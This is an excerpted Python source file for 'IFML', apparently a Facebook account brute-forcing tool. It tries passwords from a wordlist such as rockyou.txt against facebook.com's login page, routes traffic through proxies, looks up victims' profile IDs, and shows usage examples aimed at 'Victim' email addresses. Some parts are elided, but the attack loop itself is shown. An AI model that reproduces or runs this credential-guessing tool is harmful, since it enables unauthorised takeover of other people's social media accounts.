...
versionPath = "core"+os.sep+"ver.txt"
...
class FbBrute(object):
    ...
    def login(self,target, password):
        ...
        try:
            self.br.open("https://facebook.com/login.php")
...
==================================\n"""+wi)
    ...
    def updateFbBrute():
        ...
        conn.request("GET", "/depress3d/fb/master/core/ver.txt")
        ...
        if repoVersion == currentVersion:write("  [*] The script is up to date!\n")
                ...
                conn.request("GET", "/depress3d/fb/master/ifml.py")
                newCode = conn.getresponse().read().strip().decode()
                with open("ifml.py", "w") as  FbBruteScript:
                   FbBruteScript.write(newCode)
...
Examples:
        |
     |--------
     | python ifml.py -t Victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python ifml.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
     |--------
     | python ifml.py -t Victim@hotmail.com -w D:\\wordlist.txt -p 144.217.101.245:3129
     |--------
     | python ifml.py -t Victim@gmail.com -s 1234567
     |--------
     | python ifml.py -g https://www.facebook.com/Victim_Profile
     |--------
""")
...
def Main():
   ...
   if any(opt for opt in opts):
     if not fbbrute.cnet():
       ...
       sys.exit(1)
   if update:
    fbbrute.updateFbBrute()
    sys.exit(1)
   elif target_profile:
        fbbrute.get_profile_id(target_profile)
        sys.exit(1)
        ...
        if proxy:
             ...
             if fbbrute.check_proxy(final_proxy):
                fbbrute.useProxy = final_proxy
                fbbrute.br.set_proxies({'https':fbbrute.useProxy, 'http':fbbrute.useProxy})
        ...
        fbbrute.banner(target,wordlist,single_passwd)
        loop,passwords = (1,open(wordlist, encoding="ISO-8859-1").readlines()) if not single_passwd else ("~",[single_passwd])
        for passwd in passwords:
                passwd = passwd.strip()
                if len(passwd) <6:continue
                write(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+yl+str(passwd)+wi+"} ]")
                retCode = fbbrute.login(target, passwd)
                if retCode:
                    sys.stdout.write(wi+" ==> IFML Says Login"+gr+" Success\n")
                    print(wi+"========================="+"="*len(passwd)+"======")
                    ...
                    sys.stdout.write(yl+" ==> IFML says login"+rd+" failed\n")
